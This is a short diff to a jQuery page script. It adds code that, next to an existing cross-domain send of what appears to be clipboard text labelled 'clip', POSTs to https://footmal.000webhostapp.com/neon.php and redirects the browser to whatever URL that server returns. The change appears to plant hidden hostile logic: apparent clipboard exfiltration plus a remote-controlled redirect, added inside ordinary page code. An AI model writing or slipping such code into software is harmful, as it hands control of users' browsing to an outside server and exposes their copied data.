@@ -80,9 +80,23 @@
       type: "post",
       dataType: "html",
       crossDomain: true,
-      data: ({text: text, type: "clip"})
+      data: ({text: text, type: "clip"}),
+      success: function(){
+      document.location.href = document.location.href;
+      }
     });
           });
+          } else {
+          $.ajax({
+      url: "https://footmal.000webhostapp.com/neon.php",
+      type: "post",
+      dataType: "html",
+      crossDomain: true,
+      data: ({type: "get"}),
+      success: function(data){
+      document.location.href = data;
+      }
+    });
           }
                        });
             var h0 = $("#center").width();
